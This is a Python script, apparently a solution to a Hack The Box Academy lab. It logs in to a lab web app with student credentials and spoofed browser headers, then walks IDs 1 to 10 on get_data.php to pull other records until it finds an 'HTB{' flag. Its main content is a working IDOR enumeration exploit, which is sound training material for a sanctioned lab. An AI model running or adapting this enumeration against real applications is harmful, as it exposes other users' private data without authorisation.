#!/usr/bin/env python3
import requests
import re
import sys

# === Config ===
# Base address for the target application. Change this if testing a different host/port.
BASE_URL = "http://94.237.55.43:44673"
LOGIN_URL = f"{BASE_URL}/index.php"
PROFILE_URL = f"{BASE_URL}/profile.php"

# Credentials used for login. These are examples used in the lab environment.
USERNAME = "htb-stdnt"
PASSWORD = "Academy_student!"

# Optional: pre-existing PHP session id. If empty, requests.Session() will
# be assigned cookies by the server after the login POST.
PHPSESSID = ""  # Optional, can let requests manage it


if __name__ == "__main__":
    # === Initialize session ===
    # We use requests.Session so cookies and headers persist across requests.
    session = requests.Session()

    # Hardened headers: pretend to be a normal browser to avoid simple bot-detection
    # or behavior differences for non-browser clients.
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Referer": BASE_URL + "/",
        "Origin": BASE_URL,
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }

    # Optional: set PHPSESSID manually (if you want to emulate a fixed session)
    # If PHPSESSID is empty, this call does nothing harmful — the session will
    # continue to function and obtain cookies when the server sets them.
    session.cookies.set("PHPSESSID", PHPSESSID, domain="94.237.55.43", path="/")

    # === Step 1: Login POST ===
    # Many simple web apps use an HTML form with Username/Password fields; here we
    # replicate that form submission. The 'Submit' field mirrors the form button.
    data = {
        "Username": USERNAME,
        "Password": PASSWORD,
        "Submit": "Submit"
    }

    # We intentionally set allow_redirects=False so that we can inspect the server's
    # login response. A successful login commonly responds with a 302 redirect to
    # the profile page. Not following the redirect gives us a chance to verify that.
    login_resp = session.post(LOGIN_URL, headers=headers, data=data, allow_redirects=False)

    # Check for the expected login behavior: a 302 redirect to profile.php.
    if login_resp.status_code == 302 and 'Location' in login_resp.headers and login_resp.headers['Location'] == 'profile.php':
        print("[+] Login successful, redirected to profile.php")
    else:
        # If login failed or behaved unexpectedly, print helpful diagnostics and exit.
        print("[-] Login failed or unexpected response")
        print(f"Status: {login_resp.status_code}")
        print(f"Headers: {login_resp.headers}")
        exit(1)

    # === Step 2: Access profile.php ===
    # Now we actually GET the profile page using the same session. The session
    # keeps cookies (like PHPSESSID) so the server should show the logged-in profile.
    profile_resp = session.get(PROFILE_URL, headers=headers)

    if profile_resp.status_code == 200:
        print("[+] Accessed profile.php")
        # Extract welcome string: <a href="#" class="brand-logo">Welcome htb-stdnt</a>
        # This regex is a simple check to ensure the username appears on the page.
        # It's not a full HTML parser but is fine for quick checks in small scripts.
        match = re.search(r'Welcome\s+\w+', profile_resp.text)
        if match:
            print(f"[+] Found welcome string: {match.group(0)}")
            print("\n\n")
        else:
            # Not fatal — just informs the user that the expected text wasn't found.
            print("[-] Welcome string not found.")
    else:
        print("[-] Failed to access profile.php")
        print(f"Status: {profile_resp.status_code}")

    # === You can now use session for further authenticated requests! ===

    # Choose IDs 1..10 inclusive. The second argument to range() is exclusive.
    idor_range = range(1, 10+1)
    # Endpoint base for the IDOR-style request; we'll append the number.
    idor_url = f'{BASE_URL}/get_data.php?id='
    
    for i in idor_range:
        # Request the IDOR endpoint without following redirects. Many apps return
        # a 302 redirect that points to display_data.php; we want to observe that.
        idor_resp = session.request("GET", idor_url + str(i), allow_redirects=False)

        # Print response headers only. Beginners can look for 'Location' or
        # 'Set-Cookie' headers here to understand server behavior.
        print(f"Response Headers for ID {i}:")
        for header, value in idor_resp.headers.items():
            print(f"{header}: {value}")
        print("\n")

        # Manually request display_data.php with the same session. Using the same
        # session ensures cookies persist and the server treats this request as
        # coming from the same logged-in user.
        display_data_url = f'{BASE_URL}/display_data.php'
        display_data_resp = session.request("GET", display_data_url, allow_redirects=False)

        ## Extract data between <p>...</p>
        # re.DOTALL lets '.' match newlines so multi-line paragraph content is captured.
        data_matches = re.findall(r'<p>(.*?)</p>', display_data_resp.text, re.DOTALL)
        if data_matches:
            print("Extracted Data:")
            for data in data_matches:
                print(data.strip())
                # If we find a flag-like marker, exit early to avoid extra output.
                if "HTB{" in data:
                    sys.exit(0)
        else:
            # If no <p> tags are found, the information may be elsewhere or the page
            # may be an error page; this message clarifies that for learners.
            print("No data found between <p> tags.")  
        print("\n")

